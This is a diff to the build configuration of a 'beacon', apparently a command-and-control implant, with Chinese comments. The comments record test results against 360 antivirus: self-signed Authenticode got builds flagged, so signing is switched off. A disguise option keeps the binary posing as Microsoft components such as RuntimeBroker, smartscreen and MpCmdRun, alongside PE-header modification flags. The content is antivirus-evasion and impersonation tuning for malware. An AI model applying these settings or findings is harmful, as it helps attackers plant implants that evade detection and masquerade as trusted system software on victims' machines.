@@ -27,4 +27,17 @@ BEACON_PE_HEADER_MOD := true
 BEACON_PE_MOD_FLAGS := --subsystem 2 --no-rich --no-fake-sections --no-ep-trampoline --no-fake-cert --no-shuffle-dirs --no-rename-sections --no-normalize
 
 # --- L5 资源/签名层 ---
-BEACON_PSEUDO_SIGN := true
+# ★ 2026-09-21 实测改为 false：自签名 Authenticode 会把产物直接推进查杀。
+#   单变量对照（360 实时防护，每轮带良性 MinGW 对照确认天平未漂）：
+#     开签名 0/12 过   关签名 7/9 过
+#   且与证书主体**无关** —— 换成中性厂商 DN（不冒充微软）一样 0/3。
+#   挂的是"自签名"这件事本身，所以别指望换主体能救。
+#   想开回来：控制台/Web 的「Exe 伪 Authenticode 签名」勾上即可（三态开关，显式勾选优先）。
+BEACON_PSEUDO_SIGN := false
+# 产物伪装成正常 Windows 程序（文件名 + 版本信息 + 签名主体三处同源）。
+# true  = 冒充微软自家组件（RuntimeBroker / smartscreen / MpCmdRun …）
+# false = 中性身份（虚构厂商 Northwind + 通用进程名），不冒充任何真实厂商
+# ★ 实证未定：伪装从上线起就一直开着，**从未被单独验证**过。
+#   可疑点在于"自称微软 Defender 组件、却不是微软签的"这个组合本身就是强特征；
+#   改默认值前请在干净环境用 qvm_matrix.py 做对照。
+BEACON_DISGUISE := true
